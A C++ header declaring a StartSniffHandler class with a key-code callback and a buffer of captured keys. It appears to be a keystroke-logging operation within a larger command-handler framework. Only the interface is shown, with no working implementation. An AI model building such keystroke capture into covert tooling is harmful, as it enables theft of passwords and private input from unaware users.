#pragma once
#include "Handlers/IOperationHandler.hpp"

class StartSniffHandler final : public IOperationHandler
{
public:
	using IOperationHandler::IOperationHandler;
	~StartSniffHandler() override = default;
	StartSniffHandler(const StartSniffHandler&) = delete;
	StartSniffHandler& operator=(const StartSniffHandler&) = delete;
	StartSniffHandler(StartSniffHandler&&) = delete;
	StartSniffHandler& operator=(StartSniffHandler&&) = delete;

	void run() override;

private:
	void callback(int key_code);

	std::vector<uint8_t> m_keys;
};
